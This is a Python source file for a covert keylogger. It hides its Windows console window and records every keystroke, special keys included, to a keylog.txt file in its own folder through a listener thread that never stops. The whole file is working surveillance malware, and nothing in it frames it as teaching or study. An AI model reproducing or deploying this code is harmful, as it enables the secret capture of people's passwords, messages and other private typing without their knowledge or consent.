import os
import sys
import logging
from pynput import keyboard
import threading
import ctypes
import time

# Hide console window (Windows only)
def hide_console():
    if os.name == 'nt':
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
            ctypes.windll.kernel32.CloseHandle(whnd)

# Setup log file path
log_dir = os.path.abspath(os.path.dirname(__file__))
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file = os.path.join(log_dir, "keylog.txt")

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " [SPACE] ",
            keyboard.Key.enter: " [ENTER]\n",
            keyboard.Key.backspace: " [BACKSPACE] ",
            keyboard.Key.tab: " [TAB] ",
            keyboard.Key.shift: " [SHIFT] ",
            keyboard.Key.shift_r: " [SHIFT] ",
            keyboard.Key.ctrl_l: " [CTRL] ",
            keyboard.Key.ctrl_r: " [CTRL] ",
            keyboard.Key.alt_l: " [ALT] ",
            keyboard.Key.alt_r: " [ALT] ",
            keyboard.Key.esc: " [ESC] ",
            keyboard.Key.delete: " [DELETE] ",
            keyboard.Key.up: " [UP] ",
            keyboard.Key.down: " [DOWN] ",
            keyboard.Key.left: " [LEFT] ",
            keyboard.Key.right: " [RIGHT] ",
        }
        if key in special_keys:
            write_log(special_keys[key])
        else:
            write_log(f" [{str(key)}] ")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    hide_console()
    # Run keylogger in a separate thread to keep it running
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()

    # Keep the main thread alive
    while True:
        time.sleep(10)
